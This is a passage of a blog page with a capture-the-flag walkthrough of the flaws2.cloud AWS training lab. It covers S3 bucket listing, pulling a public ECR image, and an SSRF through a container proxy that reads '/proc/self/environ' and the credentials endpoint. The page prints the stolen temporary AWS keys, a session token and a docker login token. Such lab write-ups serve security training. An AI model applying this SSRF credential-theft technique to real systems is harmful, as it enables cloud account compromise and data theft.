+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~$ aws sts get-caller-identity --profile flaws2-level1
+{
+    &quot;UserId&quot;: &quot;AROAIBATWWYQXZTTALNCE:level1&quot;,
+    &quot;Account&quot;: &quot;653711331788&quot;,
+    &quot;Arn&quot;: &quot;arn:aws:sts::653711331788:assumed-role/level1/level1&quot;
+}
+</code></pre></div>
+<p>We don't seem to be able to have the right policies (privileges) to use any <code>iam</code> function, but we can list the contents of the S3 bucket located at <code>level1.flaws2.cloud</code>:</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws_2$ aws s3 ls level1.flaws2.cloud --profile flaws2-level1
+                           PRE img/
+2018-11-20 15:55:05      17102 favicon.ico
+2018-11-20 21:00:22       1905 hint1.htm
+2018-11-20 21:00:22       2226 hint2.htm
+2018-11-20 21:00:22       2536 hint3.htm
+2018-11-20 21:00:23       2460 hint4.htm
+2018-11-20 21:00:17       3000 index.htm
+2018-11-20 21:00:17       1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
+</code></pre></div>
+<p>Visiting <code>secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html</code> leads us to the next <a href="http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud/">level</a>.</p>
+<p><img alt="" src="/images/aws/training_labs/flaws_2_level2.png" /></p>
+<hr />
+<h2 id="level-2-elastic-container-registries-ecr">Level 2 - Elastic Container Registries (ECR)</h2>
+<div class="admonition help">
+<p class="admonition-title">Objective</p>
+<p>This next level is running as a container at <a href="http://container.target.flaws2.cloud/">http://container.target.flaws2.cloud/</a> Just like S3 buckets, other resources on AWS can have open permissions. I'll give you a hint that the ECR (Elastic Container Registry) is named "level2". </p>
+</div>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws_2$ aws ecr list-images --repository-name level2 --profile flaws2-level1
+{
+    &quot;imageIds&quot;: [
+        {
+            &quot;imageDigest&quot;: &quot;sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e&quot;,
+            &quot;imageTag&quot;: &quot;latest&quot;
+        }
+    ]
+}
+</code></pre></div>
+<p>https://653711331788.dkr.ecr.us-east-1.amazonaws.com</p>
+<p>docker login -u AWS -p eyJwYXlsb2FkIjoibWhjK3BHc043T1ZSSEQ0aHo3L1c3RU4yT2MyL3Iyd08rQ3dvZXcwKzRabTByMkZnVDBMeDZDTHBwZW50cnlWLytJN3F2YjRiMGM4OWxpTm9RVmp3aEpUS0tlTGVkR3lQa3ZpMjY3MVhjWjc0OFFTa25TY2YzcWdTTmwzcUtuQjU0REZGaTV4NE9rV3o1bnBEbytDazV5TE1aTzgzOVMxc2szY1FXR1I5OWZ5YUFOanpmaHVrbmZIMTRIT0pZMWx2RHlXTWVBdkNSQUd6OUM4UGc1STAzcVRiUERvNDlEa2V3NVNKeTVnUWlJNDQwaldKUTh0UWRSalMvblF5U2JrNzVFLzdXcE1zNHhtdzVtU2ZXTnp3eDFmRGdLSFlGeVVyMVU4WFpTemMyN1VFUE1BWi9qYlFFU3U5L243Q3RwWnlPemxqN3V4a0VYSnQyakNFdGFjNHZKb0JFNWF5dkFlQ3pUdzc0OVlDbll5a2pHbmRpUzJ6a1RZYkl5K0IwbDVVR0h5S0cvc2xYdUxJVkpSTHNkUTBlV0hUVU5sRmJTSHJHSUZYMmZTbnMzSUoreW1uTnR0TlNrdG1QWGZSMXhjWElVRmc2bXI4OTI2VUdLMG5kVFdFUHNGRmxYeUdvMHNvc3JsUmlxTVVKMlpjMStBN2lLWkFpZk1BZU5iN0ZpTWpPNjdnNTdQckExUjdCVmpXbjdHU1NWdGxpT1Rsc1dyM3BBcmtBMHZKYzFJT2JOaDZVNDY3a2tqWkNDaEZUaEJQcVVQRlgvWWNtNUkyb2d0VzRIKzRhMGRlbnZkQytCT2VUbVNFZVVYNTRyclpwSWNKSVBFdFFPOTJZaFJ0ajVReE9OZnZWQUJYd1hqanJvK1B4RVNiUE9JYktnRG1ISGZZMWhibTdSTWRuYk5ZM3p4T2NOYUFQYjBnSjNHUjNpWUNScjFEOFZuUUE2eTNlOEJHZ2xNRUxKZ2tSMDN5akRBdVpGOEwwVE82VjFhSWhZaE1nYzBoQXpWc2VDdHJLZ0VsdVFxWmxvYWJFeStWWFBPYy9uQytDcTQ3VmpXdGZxN1c2bGRNblFORUpibG1zZEF1WW0yL28yQUVqZW42eWJ5SndNVXZHZ3lRTi9CS0FnMnRMb1Jsb1RXbTNBNUY1Slk0N3YxRm11Q3g4b1lGVldUaU4yMStwU1lSNHpsZ0hteFlRMkY0MDBtMFFMWXFJYU04U1J1M2hkVXRRNW1wSG45SjdvTUhXckZRSHhIK1lzUmlxenVlanN0ZmRzd2lqRUgyLzRyUU9pVk9CclkvQ0hBNHR1YmpqcEtwWXFWVnlPZEtIMXV4Slh1eVBTcHRwSFZlZWc2RTR1T1pVN3dKQzhGNGhMRC9SVFJnWnR6MzhFRXZ3WkEyYWlWMVRORVJsdnI0VUhWUmt2dFUydUl5SlY0MGt0eEVkMEh3cXp6L09sWnpMS1VwbHVkaEZMcjBEVDhMT3AxYkljMTlwU0NLelJVVlBFQThiY0x6UlltZURPakNhc1FNY3pSNi9TK1ZoUXA1M0FCUTNPbHdjMWhER0VzTVdyUXZERVRjQ2dvTXQ3U2F5SSs5V3ZDR01hOFdSQ3RPTFlSSjNONE1MaEdYNm4rVXdQTDloRmt3c0piREgzTTNPYS9NRmR2ZFJZR01JYzJzODgxMWtTM0xYUFVka1J3S25NTkkxYWppcjlTL1ZCUlJ2a2tQOFVSOE42UXJzN291ODY5RGxoSTBXTzZFOWdGcDJNZXY3Yks2M3ByMXBkODBBZ1RVWGF0WlVFWkhKUCtpeEI0SGl6STNmTXVLRjRTaC82MVRjdytUa0hDUkVmWVFiWHFTM0gwPSIsImRhdGFrZXkiOiJBUUVCQUhod20wWWFJU0plUnRKbTVuMUc2dXFlZWtYdW9YWFBlNVVGY2U5UnE4LzE0d0FBQUg0d2ZBWUpLb1pJaHZjTkFRY0dvRzh3YlFJQkFEQm9CZ2txaGtpRzl3MEJCd0V3SGdZSllJWklBV1VEQkFFdU1CRUVEQ05JUGdhVk1qamJvWEF1SkFJQkVJQTdMUFlKWGdvaGw0dW5aZjBwUmVUR1lLUUIwbW5YM1E4d3hBVU5KSE1QY2syQ2dGL2hBQ2NmQlhXaEU5SHNDc3hmUms3SFB5akFEaGlGZjgwPSIsInZlcnNpb24iOiIyIiwidHlwZSI6IkRBVEFfS0VZIiwiZXhwaXJhdGlvbiI6MTY3MTIwMTg1OX0= -e none https://653711331788.dkr.ecr.us-east-1.amazonaws.com</p>
+<p>docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest</p>
+<p>http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/</p>
+<div class="highlight"><pre><span></span><code>root@9c7df3e509cf:/var/www/html# ll
+total 24
+drwxr-xr-x 1 root root 4096 Nov 27  2018 ./
+drwxr-xr-x 1 root root 4096 Nov 27  2018 ../
+-rw-r--r-- 1 root root 1890 Nov 26  2018 index.htm
+-rw-r--r-- 1 root root  612 Nov 27  2018 index.nginx-debian.html
+-rw-r--r-- 1 root root  614 Nov 27  2018 proxy.py
+-rw-r--r-- 1 root root   49 Nov 26  2018 start.sh
+root@9c7df3e509cf:/var/www/html# grep &#39;level3&#39; -R .
+./index.htm:            Read about Level 3 at &lt;a href=&quot;http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud&quot;&gt;level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud&lt;/a&gt;
+</code></pre></div>
+<hr />
+<h2 id="level-3-stealing-keys-from-ecr-metadata-service-via-ssrf">Level 3 - Stealing Keys from ECR Metadata Service via SSRF</h2>
+<div class="admonition help">
+<p class="admonition-title">Objective</p>
+<p>The container's webserver you got access to includes a simple proxy that can be access with: http://container.target.flaws2.cloud/proxy/http://flaws.cloud or http://container.target.flaws2.cloud/proxy/http://neverssl.com </p>
+</div>
+<p>HOSTNAME=e7393d8eefbb</p>
+<p>sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621</p>
+<p>proxy/file:///proc/self/environ</p>
+<p><div class="highlight"><pre><span></span><code><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="nt">&quot;RoleArn&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;arn:aws:iam::653711331788:role/level3&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="nt">&quot;AccessKeyId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ASIAZQNB3KHGKBJ23GKX&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="nt">&quot;SecretAccessKey&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;NeTGQ4KXuVgpAvifwSbu89c5P2t+U2jqOhUmMGz9&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="nt">&quot;Token&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;IQoJb3JpZ2luX2VjENL//////////wEaCXVzLWVhc3QtMSJHMEUCIQCxXCTsNKHsAz3O2N/Oxnc6yfWfMfhQCxxJyHZulaa1mQIgesLI6mu177DObNIJu7xAnCwLqOpClBXWgmHI1wQcEO0q7AMI+///////////ARADGgw2NTM3MTEzMzE3ODgiDIq+ivyr8Ofng2tMxCrAAyC8jldxrR4gRfqb+Tv/u5WRu/Mjafm6Q8S5M8Kykn9fiKF3sBGFXZg/2tU+UR0JVQvV8gyeoAnIK5F8P5WLOXcEelT+B3ZKmSI5m7o8SIcq1qsTRwMtTOnjLhhVYPVAXPogFMk0ZsVlGSCKoTTjN2dPpSIh4dSSn9nrdG/T9zg+WsA5s9J6VZqFQ6ggym0LGBUpvkAj780IEDs4WNwEqJeO5myChq0kqqcXA5QSFEMPDGu/sZnPVSObrJu/QjPstPF9NEf/4cTZEkW3P01HhfVceQeryJP1RFBnt1Wz0Q4L7DiB2xETA1bJoicsaA3/JcLO2UvPRpqKvClgv0qlBuGlyq9MGtbsd7X1JqdlOLsAspCyuv46aTOeuV3uuAfu6w+T9g0MYEcvqRGgHJG1fUyR9UWWBZwTkx8rnR9kQ9yRHNK117gdYeuLxEsjsT64PzAvATojIlGcrw4eKivv+mrr6O/Sr0SztCv1NajMtoMvYdw9X3iGWwnLUciwypQ+nFOoERlJwXqbP7nvY34YjJcdx2WfzNuT1ie0AtuwLUt9HX5tJyYKsR8kzhrFyUx5eAfv++vNRQcXbpE5Ig9MtoAwnaPvnAY6pQHOC2Snj9DJZVR85prIw1HQImQo+4Nq9TgFHoKR6asdPGYN5jp0VtIW8P/+zSKSXqEZM+ALeTmzbAn1nIbtsNNkYspQL21VeS4wE2hNQlt6PxZnOyRQBEdLCe2IAGDIgzaBg+TD2tZ24bJAMqrPVkF5q+tjf0ai0QE0kqUSV6BSNo248wO0WSEArk4xoxM1eJ4lWGBD70SouvHnLZd7kjcWS4BLRis=&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">  </span><span class="nt">&quot;Expiration&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2022-12-16T08:02:05Z&quot;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+HOSTNAME=ip-172-31-48-55.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/2fdf39e7-50cf-4e11-a47a-533525342c80AWS_EXECUTION_ENV=AWS_ECS_FARGATEAWS_DEFAULT_REGION=us-east-1ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/f6209e98011942c28c1d74f589770aec-3779599274ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/f6209e98011942c28c1d74f589770aec-3779599274PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_REGION=us-east-1PWD=/</p>
+<p>/v2/credentials/2fdf39e7-50cf-4e11-a47a-533525342c80</p>
+<div class="highlight"><pre><span></span><code>fog@cloudbreach:~/flaws_2/level3$ aws s3 ls --profile flaws2-level3
+2018-11-20 14:50:08 flaws2.cloud
+2018-11-20 13:45:26 level1.flaws2.cloud 2018-11-20 20:41:16 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud
+2018-11-26 14:47:22 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud
+2018-11-27 15:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud
+</code></pre></div>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../flaws/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Flaws I" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Flaws I
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../../../mobile/enumeration/" class="md-footer__link md-footer__link--next" aria-label="Next: Objection" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Objection
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/0xEval" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/0xEval/0xeval.github.io" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.instant", "navigation.indexes", "navigation.tracking", "navigation.sections"], "search": "../../../assets/javascripts/workers/search.16e2a7d4.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.5a2dcb6a.min.js"></script>
+      
+    
+    
+  </body>
+</html>
